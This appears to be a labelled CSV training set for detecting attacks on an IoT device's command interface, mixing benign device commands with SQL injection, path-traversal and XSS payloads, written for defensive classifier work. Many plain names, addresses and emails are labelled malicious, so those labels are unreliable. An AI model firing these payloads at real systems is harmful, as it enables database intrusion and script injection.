payload,label,attack_type
"echo, ['safe']",benign,norm
"echo, ['iot', 'sensor']",benign,norm
"run_cmd, ADD 390 222",benign,norm
"c/ garcia mosquera, 184,",malicious,cmd_parse_error
/..........................................................................{file},malicious,cmd_parse_error
"-4033')) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('ouup'='ouup",malicious,cmd_parse_error
"1) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",malicious,cmdi
choon-li,malicious,cmd_parse_error
"run_cmd, echo ['data', 'normal']",benign,norm
"start_temp_report, 6",benign,norm
"echo, ['esp32']",benign,norm
"echo, ['data', 'ok', 'esp32', 'normal']",benign,norm
"1'))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('xpks' like 'xpks",malicious,cmd_parse_error
"start_temp_report, 62",benign,norm
"run_cmd, ADD 128 722",benign,norm
9056484904037520,malicious,cmd_parse_error
"run_cmd, echo ['status']",benign,norm
"run_cmd, echo ['device']",benign,norm
"start_temp_report, 31",benign,norm
"run_cmd, ADD 181 262",benign,norm
leoncio,malicious,cmd_parse_error
villanueva del rebollar,malicious,cmd_parse_error
"echo, ['sensor', 'iot', 'payload', 'device']",benign,norm
enedn,malicious,cmd_parse_error
"1'+(select 'mdiu' where 4443=4443;select benchmark(5000000,md5(0x4c4d6142)))+'",malicious,cmdi
"echo, ['safe', 'sensor', 'esp32']",benign,norm
systems,malicious,cmd_parse_error
/..//..//..//{file},malicious,cmd_parse_error
"start_temp_report, 92",benign,norm
adjurable,malicious,cmd_parse_error
"calle barrio cura-vigo vello, 134 10?d",malicious,cmd_parse_error
"run_cmd, ADD 714 659",benign,norm
norean,malicious,cmd_parse_error
-6865) or (8459=8459)*4906 and (6107=6107,malicious,cmd_parse_error
"start_temp_report, 92",benign,norm
closa ortell,malicious,cmd_parse_error
"start_temp_report, 113",benign,norm
longhurst-street1@drae2.pa,malicious,cmd_parse_error
1)) as ewlg where 3722=3722 rlike sleep(5)--,malicious,cmd_parse_error
0904159527442646,malicious,cmd_parse_error
"start_temp_report, 104",benign,norm
92246932g,malicious,cmd_parse_error
"start_temp_report, 13",benign,norm
villar del ro,malicious,cmd_parse_error
"1) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,cmd_parse_error
"run_cmd, echo ['normal', 'status']",benign,norm
"1"") where 2070=2070;iif(5257=5257,1,1/0)",malicious,cmdi
16926,malicious,cmd_parse_error
jugen,malicious,cmd_parse_error
"start_temp_report, 56",benign,norm
"start_temp_report, 110",benign,norm
"run_cmd, echo ['data', 'device', 'hello']",benign,norm
"1%"" and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ""%""=""",malicious,cmdi
"echo, ['safe', 'data', 'report']",benign,norm
4829100959791841,malicious,cmd_parse_error
oblak,malicious,cmd_parse_error
"1'))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('qtni'='qtni",malicious,cmdi
dohanos_boulting@am-si.zw,malicious,cmd_parse_error
"echo, ['esp32', 'mqtt', 'status']",benign,norm
"echo, ['normal', 'ping', 'device']",benign,norm
"run_cmd, echo ['world', 'esp32']",benign,norm
melanson,malicious,cmd_parse_error
"echo, ['device', 'safe', 'mqtt']",benign,norm
"start_temp_report, 84",benign,norm
"run_cmd, ADD 844 479",benign,norm
"run_cmd, ADD 929 517",benign,norm
"echo, ['ok', 'safe', 'esp32', 'hello']",benign,norm
"echo, ['system', 'world']",benign,norm
"1) where 1559=1559 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",malicious,cmd_parse_error
2243766198035370,malicious,cmd_parse_error
"1%"")) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""%""=""",malicious,cmd_parse_error
"run_cmd, ADD 853 339",benign,norm
"run_cmd, echo ['system']",benign,norm
catalina mas 53 12b,malicious,cmd_parse_error
"-5957))) union all select 8485,8485,8485,8485,8485,8485,8485,8485,8485--",malicious,cmd_parse_error
nanni-prucnal@fighting-machines.gf,malicious,cmd_parse_error
i5bursa2i7,malicious,cmd_parse_error
spaeth@directoriogratuito.kr,malicious,cmd_parse_error
villaseca de henares,malicious,cmd_parse_error
"run_cmd, echo ['normal', 'ok']",benign,norm
"run_cmd, echo ['ok', 'payload', 'iot']",benign,norm
"start_temp_report, 34",benign,norm
"run_cmd, echo ['normal', 'world', 'ping']",benign,norm
retocador,malicious,cmd_parse_error
besime,malicious,cmd_parse_error
8a92rique46,malicious,cmd_parse_error
"run_cmd, echo ['ok', 'sensor', 'report']",benign,norm
"1' where 2162=2162 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",malicious,cmd_parse_error
"1 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)",malicious,cmdi
26223,malicious,cmd_parse_error
"burgos, 40, 7?a",malicious,cmd_parse_error
"run_cmd, echo ['iot', 'system']",benign,norm
"echo, ['normal']",benign,norm
"run_cmd, ADD 160 645",benign,norm
ull colmenares,malicious,cmd_parse_error
kudrewat,malicious,cmd_parse_error
"start_temp_report, 103",benign,norm
"run_cmd, echo ['ready']",benign,norm
16,malicious,cmd_parse_error
"start_temp_report, 3",benign,norm
"-9352""))) or 3038=3038",malicious,cmd_parse_error
"-3116""))) union all select 4600,4600,4600,4600--",malicious,cmd_parse_error
"echo, ['world', 'report']",benign,norm
"start_temp_report, 40",benign,norm
"run_cmd, ADD 255 945",benign,norm
"1') union all select null,null,null,null,null,null#",malicious,cmd_parse_error
"start_temp_report, 20",benign,norm
"1'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('xzcr'='xzcr",malicious,cmdi
"c/ huescar 60,",malicious,cmd_parse_error
"molinos, los",malicious,cmd_parse_error
"run_cmd, ADD 806 543",benign,norm
1%')) and 8594=(select 8594 from pg_sleep(5))--,malicious,cmd_parse_error
"1 where 7158=7158 or elt(5873=5873,sleep(5))#",malicious,cmd_parse_error
"start_temp_report, 117",benign,norm
"run_cmd, ADD 717 817",benign,norm
"1',(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4250=4250) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)",malicious,cmdi
lihul,malicious,cmd_parse_error
"start_temp_report, 32",benign,norm
"run_cmd, echo ['iot', 'status', 'safe', 'device']",benign,norm
"run_cmd, echo ['payload', 'esp32', 'sensor', 'device']",benign,norm
"echo, ['sensor', 'safe', 'status', 'normal']",benign,norm
"c/ veinat de cerdanyola, 3 6e",malicious,cmd_parse_error
car,malicious,cmd_parse_error
"start_temp_report, 10",benign,norm
"1"") as yecj where 1194=1194 and 8407=(select count(*) from generate_series(1,5000000))--",malicious,cmd_parse_error
-3921') as audo where 7087=7087 or 1755=4937--,malicious,cmd_parse_error
"1""))) union all select null,null,null,null,null,null,null,null,null--",malicious,cmd_parse_error
mara,malicious,cmd_parse_error
en8relan3amien0o,malicious,cmd_parse_error
iraci,malicious,cmd_parse_error
"run_cmd, echo ['sensor']",benign,norm
empece9ora,malicious,cmd_parse_error
"1%"" and 2805=1345",malicious,cmd_parse_error
"run_cmd, ADD 201 440",benign,norm
"zoma, la",malicious,cmd_parse_error
9327671462034435,malicious,cmd_parse_error
"echo, ['report', 'sensor', 'ping']",benign,norm
"calle salou, 26, 12g",malicious,cmd_parse_error
"echo, ['normal', 'ready', 'payload', 'ok']",benign,norm
"run_cmd, echo ['hello', 'data', 'mqtt', 'status']",benign,norm
"1')) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (('vcph'='vcph",malicious,cmd_parse_error
"start_temp_report, 116",benign,norm
"1%"") union all select null,null,null--",malicious,cmd_parse_error
-3988')) union all select 1113#,malicious,cmd_parse_error
"1 where 6965=6965 and elt(3933=1232,1232)--",malicious,cmd_parse_error
"start_temp_report, 90",benign,norm
40,malicious,cmd_parse_error
"run_cmd, ADD 256 722",benign,norm
1 rlike (select * from (select(sleep(5)))sgvo),malicious,cmd_parse_error
"start_temp_report, 27",benign,norm
"run_cmd, ADD 231 948",benign,norm
339403r90am958e,malicious,cmd_parse_error
"-5528') union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",malicious,cmd_parse_error
celik-regan@turinga.sb,malicious,cmd_parse_error
"start_temp_report, 21",benign,norm
1) and (7557=1711)*1711 and (5157=5157,malicious,cmd_parse_error
9610160798994591,malicious,cmd_parse_error
"start_temp_report, 110",benign,norm
"echo, ['sensor', 'system', 'payload']",benign,norm
4228,malicious,cmd_parse_error
los polancos 133,malicious,cmd_parse_error
"run_cmd, ADD 107 183",benign,norm
"run_cmd, echo ['iot', 'safe']",benign,norm
22533,malicious,cmd_parse_error
"1"")));(select * from (select(sleep(5)))srmq) and (((""eakt"" like ""eakt",malicious,cmdi
1') or 6793=(select 6793 from pg_sleep(5)) and ('fupe'='fupe,malicious,cmd_parse_error
"start_temp_report, 27",benign,norm
"start_temp_report, 28",benign,norm
"start_temp_report, 9",benign,norm
"start_temp_report, 13",benign,norm
"start_temp_report, 69",benign,norm
"<style>body{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</style>",malicious,xss
"run_cmd, ADD 804 202",benign,norm
"start_temp_report, 15",benign,norm
"run_cmd, echo ['payload', 'ping']",benign,norm
mathieso,malicious,cmd_parse_error
peredo huecas,malicious,cmd_parse_error
"echo, ['system', 'normal', 'hello']",benign,norm
"run_cmd, echo ['system', 'hello']",benign,norm
"run_cmd, echo ['esp32', 'mqtt', 'normal', 'ok']",benign,norm
"run_cmd, echo ['mqtt', 'ping', 'status']",benign,norm
"run_cmd, echo ['world']",benign,norm
sangres,malicious,cmd_parse_error
41240,malicious,cmd_parse_error
"run_cmd, echo ['report', 'ok', 'data', 'system']",benign,norm
torre de arcas,malicious,cmd_parse_error
1');select (case when (1039=5127) then 1039 else 1039*(select 1039 from information_schema.character_sets) end)#,malicious,cmdi
46324867s,malicious,cmd_parse_error
"run_cmd, ADD 468 654",benign,norm
"run_cmd, echo ['sensor', 'iot', 'payload']",benign,norm
"echo, ['ok', 'system', 'mqtt']",benign,norm
"run_cmd, ADD 69 541",benign,norm
8330458587602542,malicious,cmd_parse_error
"1',(select (case when (7616=7616) then 1 else 1/(select 0) end))",malicious,cmd_parse_error
"run_cmd, echo ['esp32', 'iot', 'system']",benign,norm
thiel,malicious,cmd_parse_error
42250,malicious,cmd_parse_error
"1"")) as paep where 8947=8947 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",malicious,cmd_parse_error
"run_cmd, echo ['ping', 'hello']",benign,norm
0u5o,malicious,cmd_parse_error
08520,malicious,cmd_parse_error
"echo, ['ready', 'iot', 'payload']",benign,norm
86a7o,malicious,cmd_parse_error
cargaderos 79,malicious,cmd_parse_error
"1'||(select 'rqzu' from dual where 9516=9516 or elt(5873=5873,sleep(5))#",malicious,cmdi
"1"")) as vxkn where 2443=2443 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,cmd_parse_error
cardiel de los montes,malicious,cmd_parse_error
121,malicious,cmd_parse_error
"1');select benchmark(5000000,md5(0x4c4d6142))",malicious,cmdi
"sugranyes, 166,",malicious,cmd_parse_error
"run_cmd, ADD 817 113",benign,norm
de_salis,malicious,cmd_parse_error
"da roseira s/n, 7a",malicious,cmd_parse_error
finak,malicious,cmd_parse_error
"run_cmd, ADD 669 119",benign,norm
-5067')) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (('vkab' like 'vkab,malicious,cmdi
68169107m,malicious,cmd_parse_error
todito,malicious,cmd_parse_error
"run_cmd, ADD 563 43",benign,norm
90660924f,malicious,cmd_parse_error
"run_cmd, echo ['normal', 'safe', 'sensor']",benign,norm
"1"");call regexp_substring(repeat(right(char(2385),0),500000000),null)--",malicious,cmdi
"run_cmd, ADD 673 30",benign,norm
(8266=8266)*9900,malicious,cmd_parse_error
"1"" and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""krtr"" like ""krtr",malicious,cmd_parse_error
1';begin user_lock.sleep(5); end and 'hizd'='hizd,malicious,cmdi
"echo, ['data']",benign,norm
"echo, ['esp32', 'ok', 'ready']",benign,norm
letra bala,malicious,cmd_parse_error
"-1305) or make_set(2298=5545,5545) and (6715=6715",malicious,cmd_parse_error
1 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))# lexm,malicious,cmdi
"1)));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,cmdi
"run_cmd, echo ['sensor', 'mqtt', 'payload']",benign,norm
-2214') union all select 8228#,malicious,cmd_parse_error
"1'+(select 'tjvt' where 2463=2463;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",malicious,cmdi
"start_temp_report, 51",benign,norm
villafranca del bierzo,malicious,cmd_parse_error
"1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('zknl'='zknl",malicious,cmdi
72903426g,malicious,cmd_parse_error
"start_temp_report, 19",benign,norm
"run_cmd, ADD 256 139",benign,norm
calle ecuador 143,malicious,cmd_parse_error
"run_cmd, ADD 601 272",benign,norm
"echo, ['world']",benign,norm
"start_temp_report, 17",benign,norm
"echo, ['system', 'sensor', 'status']",benign,norm
"echo, ['data', 'ok']",benign,norm
60380887e,malicious,cmd_parse_error
"run_cmd, echo ['mqtt', 'system', 'safe', 'payload']",benign,norm
42146,malicious,cmd_parse_error
10294,malicious,cmd_parse_error
"run_cmd, echo ['normal']",benign,norm
maribeth4,malicious,cmd_parse_error
"start_temp_report, 86",benign,norm
"1"") as fkgs where 5948=5948 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,cmd_parse_error
"run_cmd, echo ['report', 'esp32']",benign,norm
1)) as xcsm where 9231=9231;select sleep(5)#,malicious,cmdi
"run_cmd, echo ['ready', 'data']",benign,norm
"echo, ['ready', 'iot', 'device', 'data']",benign,norm
"run_cmd, ADD 716 443",benign,norm
"start_temp_report, 8",benign,norm
4999320970641134,malicious,cmd_parse_error
"run_cmd, echo ['payload', 'esp32']",benign,norm
"start_temp_report, 65",benign,norm
"run_cmd, ADD 702 861",benign,norm
"run_cmd, echo ['payload', 'system', 'world']",benign,norm
"1'))) and 2388=benchmark(5000000,md5(0x6d457153))#",malicious,cmd_parse_error
hotson,malicious,cmd_parse_error
"1"") as rqpp where 9383=9383 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,cmd_parse_error
-4055')) as yoez where 3816=3816 or (8459=8459)*4906--,malicious,cmd_parse_error
6516910925369020,malicious,cmd_parse_error
haiping,malicious,cmd_parse_error
-9191') as qtvm where 2838=2838 or (8459=8459)*4906--,malicious,cmd_parse_error
6894,malicious,cmd_parse_error
"carrera 55,",malicious,cmd_parse_error
"run_cmd, echo ['status', 'report']",benign,norm
56801763c,malicious,cmd_parse_error
rix,malicious,cmd_parse_error
"start_temp_report, 119",benign,norm
wolbert.navin@cirugiaalbeiteria.nu,malicious,cmd_parse_error
"run_cmd, echo ['esp32', 'ready']",benign,norm
"<iframe/src=""data:text/html; base64 ,pgjvzhkgb25sb2fkpwfszxj0kdeppg=="">",malicious,cmdi
"echo, ['mqtt', 'hello']",benign,norm
willetta,malicious,cmd_parse_error
"calle miramar, 169,",malicious,cmd_parse_error
"run_cmd, echo ['normal', 'hello', 'data']",benign,norm
"run_cmd, echo ['ready', 'normal']",benign,norm
"run_cmd, echo ['device']",benign,norm
inglis@baltasarsantos.vu,malicious,cmd_parse_error
"start_temp_report, 9",benign,norm
"run_cmd, ADD 43 795",benign,norm
setabitano,malicious,cmd_parse_error
"start_temp_report, 94",benign,norm
"calle aluders, 96",malicious,cmd_parse_error
"1%')) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('%'='",malicious,cmd_parse_error
"1%'))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((('%'='",malicious,cmd_parse_error
"echo, ['normal', 'mqtt']",benign,norm
(select (chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3287=3287) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),malicious,cmdi
"1')) union all select null,null,null,null--",malicious,cmd_parse_error
"run_cmd, ADD 983 911",benign,norm
"echo, ['iot', 'normal']",benign,norm
linnell,malicious,cmd_parse_error
"echo, ['system', 'report', 'ok']",benign,norm
soportador,malicious,cmd_parse_error
1%')));(select * from (select(sleep(5)))srmq) and ((('%'=',malicious,cmdi
7633,malicious,cmd_parse_error
"start_temp_report, 22",benign,norm
"start_temp_report, 89",benign,norm
"run_cmd, ADD 349 729",benign,norm
"echo, ['report', 'sensor', 'device', 'system']",benign,norm
5r34osa,malicious,cmd_parse_error
"c/ norte 9,",malicious,cmd_parse_error
"campo de mirra/camp de mirra, el",malicious,cmd_parse_error
pozanco,malicious,cmd_parse_error
47689,malicious,cmd_parse_error
22100487v,malicious,cmd_parse_error
"start_temp_report, 5",benign,norm
"start_temp_report, 57",benign,norm
"1') as ohcs where 9588=9588 or elt(6272=6272,sleep(5))--",malicious,cmd_parse_error
"run_cmd, echo ['ok', 'iot', 'mqtt']",benign,norm
jarmo,malicious,cmd_parse_error
drapinska@mataluenga.pg,malicious,cmd_parse_error
"start_temp_report, 26",benign,norm
"echo, ['system', 'payload', 'sensor']",benign,norm
"1) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",malicious,cmdi
0883673418976752,malicious,cmd_parse_error
cercedilla,malicious,cmd_parse_error
del cid labastie,malicious,cmd_parse_error
"1)) as nlzg where 1482=1482 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",malicious,cmd_parse_error
"run_cmd, ADD 74 188",benign,norm
bricat,malicious,cmd_parse_error
"echo, ['normal', 'esp32']",benign,norm
"echo, ['hello', 'payload', 'ping']",benign,norm
madriles hernandez,malicious,cmd_parse_error
"echo, ['device', 'ok', 'ready', 'world']",benign,norm
"1')) as eleh where 1347=1347 or 8421=(select count(*) from generate_series(1,5000000))--",malicious,cmd_parse_error
"run_cmd, echo ['ping', 'sensor', 'mqtt']",benign,norm
"echo, ['safe', 'world', 'ok', 'data']",benign,norm
"run_cmd, ADD 334 416",benign,norm
"run_cmd, echo ['hello', 'ready', 'status', 'normal']",benign,norm
"1))) or 8466=benchmark(5000000,md5(0x694a4745)) and (((8671=8671",malicious,cmd_parse_error
"start_temp_report, 62",benign,norm
49719,malicious,cmd_parse_error
"run_cmd, ADD 505 740",benign,norm
"echo, ['iot']",benign,norm
yolanthe,malicious,cmd_parse_error
ilia,malicious,cmd_parse_error
"run_cmd, echo ['ok', 'system', 'mqtt', 'ready']",benign,norm
"run_cmd, ADD 774 996",benign,norm
"-4513""))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((""gytb""=""gytb",malicious,cmdi
"run_cmd, echo ['world', 'iot', 'safe']",benign,norm
hole@chicashumedas.at,malicious,cmd_parse_error
navalvillar de ibor,malicious,cmd_parse_error
dennett,malicious,cmd_parse_error
"1'))) union all select null,null,null,null,null,null,null,null,null,null--",malicious,cmd_parse_error
"run_cmd, echo ['ping', 'report', 'normal']",benign,norm
252,malicious,cmd_parse_error
5568778491902564,malicious,cmd_parse_error
"start_temp_report, 81",benign,norm
"run_cmd, echo ['esp32', 'ping']",benign,norm
"calle san sebastian, 154 13d",malicious,cmd_parse_error
"1"")) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""gxqq""=""gxqq",malicious,cmd_parse_error
"1' where 4185=4185 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",malicious,cmd_parse_error
conceptualismo,malicious,cmd_parse_error
tresjuncos,malicious,cmd_parse_error
29320,malicious,cmd_parse_error
"run_cmd, echo ['iot']",benign,norm
24175,malicious,cmd_parse_error
"run_cmd, ADD 485 116",benign,norm
"run_cmd, echo ['ping', 'device', 'safe']",benign,norm
5exas9labo,malicious,cmd_parse_error
"c/ capella, 141, 4?g",malicious,cmd_parse_error
"echo, ['esp32', 'data']",benign,norm
"start_temp_report, 57",benign,norm
ros,malicious,cmd_parse_error
"-7146"" where 6431=6431 or 8548=5549--",malicious,cmd_parse_error
97531792q,malicious,cmd_parse_error
"start_temp_report, 26",benign,norm
"1,(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (7823=7823) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))",malicious,cmdi
"echo, ['iot']",benign,norm
edmundsen@sindns.info,malicious,cmd_parse_error
"start_temp_report, 4",benign,norm
"start_temp_report, 55",benign,norm
"echo, ['world', 'data']",benign,norm
cabanabona,malicious,cmd_parse_error
"1"")) as sqow where 8752=8752;select (case when (1726=4080) then 1726 else 1/(select 0) end)--",malicious,cmdi
08110,malicious,cmd_parse_error
larenas derch,malicious,cmd_parse_error
"c/ escultor julio gonzalez 88,",malicious,cmd_parse_error
"""data:text/html;base64,phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==""></embed>",malicious,cmdi
"run_cmd, ADD 726 547",benign,norm
5302,malicious,cmd_parse_error
"1"") and 2006=2006",malicious,cmd_parse_error
d308ada,malicious,cmd_parse_error
6258,malicious,cmd_parse_error
"start_temp_report, 64",benign,norm
5599,malicious,cmd_parse_error
"echo, ['device']",benign,norm
b3st2z4,malicious,cmd_parse_error
"1%"") or 6793=(select 6793 from pg_sleep(5)) and (""%""=""",malicious,cmd_parse_error
mcduffie,malicious,cmd_parse_error
myrna5@adondeir.at,malicious,cmd_parse_error
"run_cmd, ADD 490 758",benign,norm
"run_cmd, ADD 533 420",benign,norm
thomasia,malicious,cmd_parse_error
"echo, ['safe', 'ok']",benign,norm
"run_cmd, echo ['ping', 'payload', 'world']",benign,norm
"run_cmd, echo ['device', 'status', 'report']",benign,norm
mkpwent,malicious,cmd_parse_error
"start_temp_report, 58",benign,norm
"run_cmd, echo ['safe']",benign,norm
"run_cmd, ADD 953 356",benign,norm
"run_cmd, ADD 19 436",benign,norm
c356conio,malicious,cmd_parse_error
isidoro,malicious,cmd_parse_error
//..{file},malicious,cmd_parse_error
"<script>alert(""crosssitescripting"")</script>"";' >",malicious,xss
"run_cmd, echo ['status', 'safe', 'ok']",benign,norm
"1' or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'nelb'='nelb",malicious,cmdi
"start_temp_report, 113",benign,norm
"-5190%"" or 8298=9306 and ""%""=""",malicious,cmd_parse_error
"run_cmd, echo ['safe', 'iot', 'status', 'report']",benign,norm
couto capellades,malicious,cmd_parse_error
escribida,malicious,cmd_parse_error
"1 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,cmdi
7754747447747860,malicious,cmd_parse_error
"echo, ['hello', 'ready']",benign,norm
"start_temp_report, 12",benign,norm
"start_temp_report, 101",benign,norm
"start_temp_report, 60",benign,norm
"echo, ['data', 'world', 'system']",benign,norm
cambiazo,malicious,cmd_parse_error
"run_cmd, echo ['ready', 'status', 'world', 'device']",benign,norm
"cartago 117, 12?b",malicious,cmd_parse_error
"start_temp_report, 107",benign,norm
"1'+(select pepf where 5071=5071 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,cmdi
merkling,malicious,cmd_parse_error
watts@viajesnacionales.na,malicious,cmd_parse_error
"start_temp_report, 11",benign,norm
"run_cmd, ADD 724 956",benign,norm
-7404' where 1536=1536 order by 1#,malicious,cmd_parse_error
09529349n,malicious,cmd_parse_error
"start_temp_report, 74",benign,norm
"run_cmd, ADD 545 823",benign,norm
"run_cmd, echo ['ok']",benign,norm
"-8053"" where 5458=5458 or 9323=9323#",malicious,cmd_parse_error
"echo, ['normal']",benign,norm
"start_temp_report, 54",benign,norm
"1')) as nlfq where 3410=3410 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",malicious,cmd_parse_error
"c/ juan carlos onetti 4, 1?d",malicious,cmd_parse_error
"run_cmd, echo ['normal']",benign,norm
"run_cmd, echo ['sensor', 'mqtt', 'hello']",benign,norm
"escritor nicolas del paso, 95",malicious,cmd_parse_error
"start_temp_report, 61",benign,norm
"run_cmd, ADD 614 921",benign,norm
elbeze,malicious,cmd_parse_error
8708,malicious,cmd_parse_error
"echo, ['ping', 'sensor', 'normal', 'payload']",benign,norm
"start_temp_report, 58",benign,norm
"run_cmd, echo ['data', 'sensor']",benign,norm
faustino cavadas 162 6-a,malicious,cmd_parse_error
"run_cmd, echo ['system', 'world', 'hello']",benign,norm
"run_cmd, ADD 555 571",benign,norm
"start_temp_report, 83",benign,norm
charley,malicious,cmd_parse_error
"start_temp_report, 14",benign,norm
"1) as qwsa where 2874=2874;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",malicious,cmdi
patterso,malicious,cmd_parse_error
froud,malicious,cmd_parse_error
"start_temp_report, 70",benign,norm
"run_cmd, echo ['report', 'sensor']",benign,norm
"run_cmd, ADD 875 333",benign,norm
hotta,malicious,cmd_parse_error
1) and 4595=4595#,malicious,cmd_parse_error
cunanan,malicious,cmd_parse_error
"run_cmd, echo ['esp32', 'status']",benign,norm
"run_cmd, echo ['report']",benign,norm
"start_temp_report, 21",benign,norm
"run_cmd, echo ['hello', 'data']",benign,norm
"-6580') union all select 9950,9950,9950,9950,9950,9950--",malicious,cmd_parse_error
6402233708225431,malicious,cmd_parse_error
24331853s,malicious,cmd_parse_error
-6947')) as qqjp where 6700=6700 union all select 6700#,malicious,cmd_parse_error
"run_cmd, ADD 738 39",benign,norm
"run_cmd, ADD 690 649",benign,norm
/..0x2f..0x2f{file},malicious,cmd_parse_error
"start_temp_report, 35",benign,norm
fraccionaria,malicious,cmd_parse_error
"run_cmd, ADD 959 409",benign,norm
"run_cmd, echo ['esp32', 'sensor', 'ready']",benign,norm
hrenyk,malicious,cmd_parse_error
"run_cmd, echo ['iot']",benign,norm
"run_cmd, ADD 541 996",benign,norm
